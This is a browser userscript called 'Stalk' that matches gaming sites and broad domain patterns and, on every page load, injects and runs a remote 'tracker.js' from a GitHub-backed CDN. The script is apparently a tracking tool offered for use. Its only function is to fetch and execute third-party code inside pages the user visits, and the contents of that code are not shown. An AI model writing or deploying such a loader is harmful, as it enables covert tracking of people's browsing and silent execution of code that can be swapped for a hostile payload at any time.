// ==UserScript==
// @name         Stalk
// @namespace    http://github.com/LightLordYT
// @version      1.3.2
// @description  a simple script that allows you to stalk certain websites with @match
// @author       LightLord
// @match        https://crazygames.com/*
// @match        https://poki.com/*
// @match        https://*.io/
// @match        https://*.one/
// @match        https://*.com/
// @match        https://*.net/
// @match        https://*.org/
// @match        https://*.us/
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        none
// ==/UserScript==

window.onload = () => {
    let script = document.createElement('script')
    let head = document.head
    script.src = 'https://cdn.jsdelivr.net/gh/LightLordYT/LimitScript/tracker.js'
    head.append(script)
}